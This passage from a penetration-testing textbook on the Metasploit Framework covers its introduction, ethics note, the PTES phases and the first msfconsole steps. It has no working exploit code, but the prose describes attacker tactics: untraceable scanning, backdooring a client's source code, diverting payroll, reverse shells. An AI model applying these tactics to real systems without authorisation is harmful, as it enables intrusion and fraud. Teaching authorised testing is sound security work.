show, in a safe and controlled manner, how an attacker might be able to cause serious harm to an organization and impact its ability to, among other things, generate reve- nue, maintain its reputation, and protect its customers.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark12">Why Metasploit?</a><a name="bookmark20">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit isn’t just a tool; it’s an entire framework that provides the infra- structure needed to automate mundane, routine, and complex tasks. This allows you to concentrate on the unique or specialized aspects of penetration testing and on identifying flaws within your information security program.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">As you progress through the chapters in this book and establish a well- rounded methodology, you will begin to see the many ways in which Meta- sploit can be used in your penetration tests. Metasploit allows you to easily build attack vectors to augment its exploits, payloads, encoders, and more in order to create and execute more advanced attacks. At various points in this book we explain several third-party tools—including some written by the authors of this book—that build on the Metasploit Framework. Our goal is to get you comfortable with the Framework, show you some advanced attacks, and ensure that you can apply these techniques responsibly. We hope you enjoy reading this book as much as we enjoyed creating it. Let the fun and games begin.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark13">A Brief History of Metasploit</a><a name="bookmark21">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit was originally developed and conceived by HD Moore while he was employed by a security firm. When HD realized that he was spending most of his time validating and sanitizing public exploit code, he began to create a flexible and maintainable framework for the creation and develop- ment of exploits. He released his first edition of the Perl-based Metasploit in October 2003 with a total of 11 exploits.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">With the help of Spoonm, HD released a total rewrite of the project, Metasploit 2.0, in April 2004. This version included 19 exploits and over 27 payloads. Shortly after this release, Matt Miller (Skape) joined the Metasploit development team, and as the project gained popularity, the Metasploit Frame- work received heavy backing from the information security community and quickly became a necessary tool for penetration testing and exploitation.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Following a complete rewrite in the Ruby programming language, the Metasploit team released Metasploit 3.0 in 2007. The migration of the</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">Framework from Perl to Ruby took 18 months and resulted in over 150,000 lines of new code. With the 3.0 release, Metasploit saw widespread adoption in the security community and a big increase in user contributions.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In fall 2009, Metasploit was acquired by Rapid7, a leader in the vulnerability-scanning field, which allowed HD to build a team to focus solely on the development of the Metasploit Framework. Since the acquisi- tion, updates have occurred more rapidly than anyone could have imagined. Rapid7 released two commercial products based on the Metasploit Frame- work: Metasploit Express and Metasploit Pro. Metasploit Express is a lighter version of the Metasploit Framework with a GUI and additional functionality, including reporting, among other useful features. Metasploit Pro is an expanded version of Metasploit Express that touts collaboration and group penetration testing and such features as a one-click virtual private network (VPN) tunnel and much more.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark14">About This Book</a><a name="bookmark22">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">This book is designed to teach you everything from the fundamentals of the Framework to advanced techniques in exploitation. Our goal is to pro-</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">vide a useful tutorial for the beginner and a reference for practitioners. How- ever, we won’t always hold your hand. Programming knowledge is a definite advantage in the penetration testing field, and many of the examples in this book will use either the Ruby or Python programming language. Still, while we suggest that you learn a language like Ruby or Python to aid in advanced exploitation and customization of attacks, programming knowledge is not required.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">As you grow more comfortable with Metasploit, you will notice that the Framework is frequently updated with new features, exploits, and attacks. This book was developed with the knowledge that Metasploit is continually changing and that no printed book is likely to be able to keep pace with this rapid development. Therefore, we focus on the fundamentals, because once you understand how Metasploit works you will be able to ramp up quickly with updates to the Framework.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark15">What’s in the Book?</a><a name="bookmark23">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">How can this book help you to get started or take your skills to the next level? Each chapter is designed to build on the previous one and to help you build your skills as a penetration tester from the ground up.</p><ul id="l1"><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 1, “The Absolute Basics of Penetration Testing,” establishes the methodologies around penetration testing.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 2, “Metasploit Basics,” is your introduction to the various tools within the Metasploit Framework.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 3, “Intelligence Gathering,” shows you ways to leverage Meta- sploit in the reconnaissance phase of a penetration test.</p><p class="s14" style="padding-top: 7pt;padding-left: 358pt;text-indent: 0pt;text-align: left;">Introduction <span class="s13">xxiii</span></p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 4, “Vulnerability Scanning,” walks you through identifying vul- nerabilities and leveraging vulnerability scanning technology.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 5, “The Joy of Exploitation,” throws you into exploitation.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 6, “Meterpreter,” walks you through the Swiss Army knife of post exploitation: Meterpreter.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 7, “Avoiding Detection,” focuses on the underlying concepts of antivirus evasion techniques.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 8, “Exploitation Using Client-Side Attacks,” covers client-side exploitation and browser bugs.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 9, “Metasploit Auxiliary Modules,” walks you through auxiliary modules.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 10, “The Social-Engineer Toolkit,” is your guide to leveraging the Social-Engineer Toolkit in social-engineering attacks.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 11, “Fast-Track,” offers a complete run down on Fast-Track, an automated penetration testing framework.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 12, “Karmetasploit,” shows you how to leverage Karmetasploit for wireless attacks.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 13, “Building Your Own Modules,” teaches you how to build your own exploitation module.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 14, “Creating Your Own Exploits,” covers fuzzing and creating exploit modules out of buffer overflows.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 15, “Porting Exploits to the Metasploit Framework,” is an in- depth look at how to port existing exploits into a Metasploit-based module.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 16, “Meterpreter Scripting,” shows you how to create your own Meterpreter scripts.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Chapter 17, “Simulated Penetration Test,” pulls everything together as it walks you through a simulated penetration test.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark16">A Note on Ethics</a><a name="bookmark24">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Our goal in writing this book is to help you to improve your skills as a pene- tration tester. As a penetration tester, you will be bypassing security measures; that’s simply part of the job. When you do, keep the following in mind:</p></li><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Don’t be malicious.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Don’t be stupid.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Don’t attack targets without written permission.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Consider the consequences of your actions.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">If you do things illegally, you can be caught and put in jail!</p></li></ul><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Neither the authors of this book nor No Starch Press, its publisher, condones or encourages the misuse of the penetration testing techniques discussed herein. Our goal is to make you smarter, not to help you to get into trouble, because we won’t be there to get you out.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 240pt;text-indent: 0pt;text-align: left;"><span><img width="35" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_006.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 9pt;padding-left: 138pt;text-indent: -15pt;line-height: 87%;text-align: left;"><a name="bookmark25">TH E ABSOLUTE BASICS OF PENETRATION TESTING </a><a name="bookmark39">&zwnj;</a><a name="bookmark40">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Penetration testing is a way for you to simulate the methods that an attacker might use to circumvent security controls and gain access to an organization’s systems. Penetration testing is more than running scan- ners and automated tools and then writing a report.</p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">And you won’t become an expert penetration tester overnight; it takes years of practice and real-world experience to become proficient.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Currently, there is a shift in the way people regard and define penetra- tion testing within the security industry. The <span class="s19">Penetration Testing Execution Standard (PTES) </span>is redefining the penetration test in ways that will affect both new and experienced penetration testers, and it has been adopted by several leading members of the security community. Its charter is to define and raise awareness about what a true penetration test means by establishing a baseline of fundamental principles required to conduct a penetration test. If you’re new to penetration testing or unfamiliar with PTES, visit <a href="http://www.pentest-standard.org/" class="s20" target="_blank">http:// </a><span class="s19">www.pentest-standard.org/ </span>to learn more about it.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark26">The Phases of the PTES</a><a name="bookmark41">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">PTES phases are designed to define a penetration test and assure the client organization that a standardized level of effort will be expended in a pene- tration test by anyone conducting this type of assessment. The standard is divided into seven categories with different levels of effort required for each, depending on the organization under attack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark27">Pre-engagement Interactions</a><a name="bookmark42">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Pre-engagement interactions <span class="p">typically occur when you discuss the scope and terms of the penetration test with your client. It is critical during pre-engagement that you convey the goals of the engagement. This stage also serves as your opportunity to educate your customer about what is to be expected from a thorough, full-scope penetration test—one without restrictions regarding what can and will be tested during the engagement.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark28">Intelligence Gathering</a><a name="bookmark43">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In the <span class="s19">intelligence gathering </span>phase, you will gather any information you can about the organization you are attacking by using social-media networks, Google hacking, footprinting the target, and so on. One of the most impor- tant skills a penetration tester can have is the ability to learn about a target, including how it behaves, how it operates, and how it ultimately can be attacked. The information that you gather about your target will give you valuable insight into the types of security controls in place.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">During intelligence gathering, you attempt to identify what protection mechanisms are in place at the target by slowly starting to probe its systems. For example, an organization will often only allow traffic on a certain subset of ports on externally facing devices, and if you query the organization on any- thing other than a whitelisted port, you will be blocked. It is generally a good idea to test this blocking behavior by initially probing from an expendable IP address that you are willing to have blocked or detected. The same holds true when you’re testing web applications, where, after a certain threshold, the web application firewalls will block you from making further requests.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To remain undetected during these sorts of tests, you can perform your initial scans from IP address ranges that can’t be linked back to you and your team. Typically, organizations with an external presence on the Internet experience attacks every day, and your initial probing will likely be an unde- tected part of the background noise.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: justify;">NOTE <span class="s19">In some cases, it might make sense to run very noisy scans from an entirely different IP range other than the one you will be using for the main attack. This will help you deter- mine how well the organization responds to the tools you are using.</span></p><p class="s21" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark29">Threat Modeling</a><a name="bookmark44">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Threat modeling <span class="p">uses the information you acquired in the intelligence-gathering phase to identify any existing vulnerabilities on a target system. When perform- ing threat modeling, you will determine the most effective attack method,</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">the type of information you are after, and how the organization might be attacked. Threat modeling involves looking at an organization as an adversary and attempting to exploit weaknesses as an attacker would.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark30">Vulnerability Analysis</a><a name="bookmark45">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having identified the most viable attack methods, you need to consider how you will access the target. During <span class="s19">vulnerability analysis</span>, you combine the infor- mation that you’ve learned from the prior phases and use it to understand what attacks might be viable. Among other things, vulnerability analysis takes into account port and vulnerability scans, data gathered by banner grabbing, and information collected during intelligence gathering.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark31">Exploitation</a><a name="bookmark46">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Exploitation <span class="p">is probably one of the most glamorous parts of a penetration test, yet it is often done with brute force rather than with precision. An exploit should be performed only when you know almost beyond a shadow of a doubt that a particular exploit will be successful. Of course, unforeseen protective measures might be in place on the target that prevent a particular exploit from working—but before you trigger a vulnerability, you should know that the system is vulnerable. Blindly firing off a mass onslaught of exploits and praying for a shell isn’t productive; it is noisy and provides little if any value to you as a penetration tester or to your client. Do your homework first, and then launch well-researched exploits that are likely to succeed.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark32">Post Exploitation</a><a name="bookmark47">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s19">post exploitation </span>phase begins after you have compromised one or more systems—but you’re not even close to being done yet.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Post exploitation is a critical component in any penetration test. This is where you differentiate yourself from the average, run-of-the-mill hacker and actually provide valuable information and intelligence from your penetration test. Post exploitation targets specific systems, identifies critical infrastructure, and targets information or data that the company values most and that it has attempted to secure. When you exploit one system after another, you are try- ing to demonstrate attacks that would have the greatest business impact.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When attacking systems in post exploitation, you should take the time to determine what the various systems do and their different user roles. For example, suppose you compromise a domain infrastructure system and you’re running as an enterprise administrator or have domain administrative-level rights. You might be king of the domain, but what about the systems that communicate with Active Directory? What about the main financial applica- tion that is used to pay employees? Could you compromise that system, and then, on the next pay cycle, have it route all the money out of the company to an offshore account? How about the target’s intellectual property?</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Suppose, for example, that your client is a large software development shop that ships custom-coded applications to customers for use in manufac- turing environments. Can you backdoor their source code and essentially compromise all of their customers? What would that do to harm their brand credibility?</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Post exploitation is one of those tricky scenarios in which you must take the time to learn what information is available to you and then use that infor- mation to your benefit. An attacker would generally spend a significant amount of time in a compromised system doing the same. Think like a malicious attacker—be creative, adapt quickly, and rely on your wits instead of auto- mated tools.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark33">Reporting</a><a name="bookmark48">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Reporting <span class="p">is by far the most important element of a penetration test. You will use reports to communicate what you did, how you did it, and, most impor- tant, how the organization should fix the vulnerabilities discovered during the penetration test.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When performing a penetration test, you’re working from an attacker’s point of view, something that organizations rarely see. The information you obtain during a test is vital to the success of the organization’s information security program and in stopping future attacks. As you compile and report your findings, think about how the organization can use your findings to raise awareness, remediate the issues discovered, and improve overall security rather than just patch the technical vulnerabilities.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">At a minimum, divide your report into an executive summary, executive presentation, and technical findings. The technical findings will be used by the client to remediate security holes, but this is also where the value lies in a penetration test. For example, if you find a SQL injection vulnerability in the client’s web-based applications, you might recommend that your client sani- tize all user input, leverage parameterized SQL queries, run SQL as a limited user account, and turn on custom error messages.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">After the client implements your recommendations and fixes the one specific SQL injection vulnerability, are they really protected from SQL injec- tion? No. An underlying problem likely caused the SQL injection vulnerability in the first place, such as a failure to ensure that third-party applications are secure. Those will need to be fixed as well.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark34">Types of Penetration Tests</a><a name="bookmark49">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Now that you have a basic understanding of the seven PTES categories, let’s examine the two main types of penetration tests: <span class="s19">overt </span>and <span class="s19">covert. </span>An overt pen test, or “white hat” test, occurs with the organization’s full knowledge; covert tests are designed to simulate the actions of an unknown and unan- nounced attacker. Both tests offer advantages and disadvantages.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark35">Overt Penetration Testing</a><a name="bookmark50">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Using overt penetration testing, you work with the organization to identify potential security threats, and the organization’s IT or security team shows you the organization’s systems. The one main benefit of an overt test is that you have access to insider knowledge and can launch attacks without fear of being blocked. A potential downside to overt testing is that overt tests might not effectively test the client’s incident response program or identify how well the security program detects certain attacks. When time is limited and certain PTES steps such as intelligence gathering are out of scope, an overt test may be your best option.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark36">Covert Penetration Testing</a><a name="bookmark51">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Unlike overt testing, sanctioned covert penetration testing is designed to sim- ulate the actions of an attacker and is performed without the knowledge of most of the organization. Covert tests are performed to test the internal security team’s ability to detect and respond to an attack.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Covert tests can be costly and time consuming, and they require more skill than overt tests. In the eyes of penetration testers in the security industry, the covert scenario is often preferred because it most closely simulates a true attack. Covert attacks rely on your ability to gain information by reconnais- sance. Therefore, as a covert tester, you will typically not attempt to find a large number of vulnerabilities in a target but will simply attempt to find the easiest way to gain access to a system, undetected.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark37">Vulnerability Scanners</a><a name="bookmark52">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Vulnerability scanners are automated tools used to identify security flaws affecting a given system or application. Vulnerability scanners typically work by <span class="s19">fingerprinting </span>a target’s operating system (that is, identifying the version and type) as well as any services that are running. Once you have fingerprinted the target’s operating system, you use the vulnerability scanner to execute specific checks to determine whether vulnerabilities exist. Of course, these checks are only as good as their creators, and, as with any fully automated solution, they can sometimes miss or misrepresent vulnerabilities on a system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Most modern vulnerability scanners do an amazing job of minimizing false positives, and many organizations use them to identify out-of-date systems or potential new exposures that might be exploited by attackers.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Vulnerability scanners play a very important role in penetration testing, especially in the case of overt testing, which allows you to launch multiple attacks without having to worry about avoiding detection. The wealth of knowledge gleaned from vulnerability scanners can be invaluable, but beware of relying on them too heavily. The beauty of a penetration test is that it can’t be automated, and attacking systems successfully requires that you have knowledge and skills. In most cases, when you become a skilled penetration tester, you will rarely use a vulnerability scanner but will rely on your knowl- edge and expertise to compromise a system.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark38">Pulling It All Together</a><a name="bookmark53">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">If you’re new to penetration testing or haven’t really adopted a formal methodology, study the PTES. As with any experiment, when performing a penetration test, ensure that you have a refined and adaptable process that is also repeatable. As a penetration tester, you need to ensure that your intelli- gence gathering and vulnerability analysis are as expert as possible, to give you an advantage in adapting to scenarios as they present themselves.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 232pt;text-indent: 0pt;text-align: left;"><span><img width="65" height="123" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_007.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 150pt;text-indent: 0pt;text-align: left;"><a name="bookmark54">METASPLOIT BASICS </a><a name="bookmark71">&zwnj;</a><a name="bookmark72">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-top: 15pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When you encounter the Metasploit Framework (MSF) for the first time, you might be overwhelmed by its many interfaces, options, utilities, variables, and mod- ules. In this chapter, we’ll focus on the basics that will help you make sense of the big picture. We’ll review some basic penetration testing terminology and then</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">briefly cover the various user interfaces that Metasploit has to offer. Meta- sploit itself is free, open source software, with many contributors in the secu- rity community, but two commercial Metasploit versions are also available.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">When first using Metasploit, it’s important not to get hung up on that new- est exploit; instead, focus on how Metasploit functions and what commands you used to make the exploit possible.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark55">Terminology</a><a name="bookmark73">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Throughout this book, we’ll use various terms that first bear some explana- tion. The majority of the following basic terms are defined in the context of Metasploit, but they are generally the same throughout the security industry.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark56">Exploit</a><a name="bookmark74">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">An <span class="s19">exploit </span>is the means by which an attacker, or pen tester for that matter, takes advantage of a flaw within a system, an application, or a service. An attacker uses an exploit to attack a system in a way that results in a particular desired outcome that the developer never intended. Common exploits include buffer overflows, web application vulnerabilities (such as SQL injection), and con- figuration errors.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark57">Payload</a><a name="bookmark75">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">A <span class="s19">payload </span>is code that we want the system to execute and that is to be selected and delivered by the Framework. For example, a <span class="s19">reverse shell </span>is a payload that creates a connection from the target machine back to the attacker as a Win- dows command prompt (see Chapter 5), whereas a <span class="s19">bind shell </span>is a payload that “binds” a command prompt to a listening port on the target machine, which the attacker can then connect. A payload could also be something as simple as a few commands to be executed on the target operating system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark58">Shellcode</a><a name="bookmark76">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Shellcode <span class="p">is a set of instructions used as a payload when exploitation occurs. Shellcode is typically written in assembly language. In most cases, a command shell or a Meterpreter shell will be provided after the series of instructions have been performed by the target machine, hence the name.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark59">Module</a><a name="bookmark77">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">A <span class="s19">module </span>in the context of this book is a piece of software that can be used by the Metasploit Framework. At times, you may require the use of an <span class="s19">exploit module</span>, a software component that conducts the attack. Other times, an <span class="s19">auxiliary module </span>may be required to perform an action such as scanning or system enumeration. These interchangeable modules are the core of what makes the Framework so powerful.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark60">Listener</a><a name="bookmark78">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">A <span class="s19">listener </span>is a component within Metasploit that waits for an incoming connection of some sort. For example, after the target machine has been exploited, it may call the attacking machine over the Internet. The listener handles that connec- tion, waiting on the attacking machine to be contacted by the exploited system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark61">Metasploit Interfaces</a><a name="bookmark79">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit offers more than one interface to its underlying functionality, including console, command line, and graphical interfaces. In addition to these interfaces, utilities provide direct access to functions that are normally internal to the Metasploit Framework. These utilities can be invaluable for exploit development and situations for which you do not need the flexibility of the entire Framework.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark62">MSFconsole</a><a name="bookmark80">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Msfconsole <span class="p">is by far the most popular part of the Metasploit Framework, and for good reason. It is one of the most flexible, feature-rich, and well- supported tools within the Framework. </span>Msfconsole <span class="p">provides a handy all-in-one interface to almost every option and setting available in the Framework; it’s like a one-stop shop for all of your exploitation dreams. You can use </span>msfconsole <span class="p">to do everything, including launching an exploit, loading auxiliary modules, performing enumeration, creating listeners, or running mass exploitation against an entire network.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Although the Metasploit Framework is constantly changing, a subset of commands remain relatively constant. By mastering the basics of <span class="s19">msfconsole</span>, you will be able to keep up with any changes. To illustrate the importance of learning <span class="s19">msfconsole</span>, it will be used in nearly every chapter of the book.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s23" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Starting MSFconsole</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">To launch <span class="s19">msfconsole</span>, enter <span class="s24">msfconsole </span>at the command line:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_008.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/# <span class="s24">cd /opt/framework3/msf3/</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework/msf3# <span class="s24">msfconsole</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&lt; metasploit &gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 94pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="69" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_009.png"/></span></p><p class="s25" style="padding-top: 3pt;padding-left: 120pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\ ,<u> </u>,</p><p class="s25" style="padding-left: 137pt;text-indent: -12pt;text-align: left;">\ (oo) (<u> </u>) )\</p><p class="s25" style="padding-left: 149pt;text-indent: 0pt;line-height: 10pt;text-align: left;">||--|| *</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_010.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To access <span class="s19">msfconsole</span>’s help files, enter <span class="s24">help </span>followed by the command which you are interested in. In the next example, we are looking for help for the command <span class="s25">connect</span>, which allows us to communicate 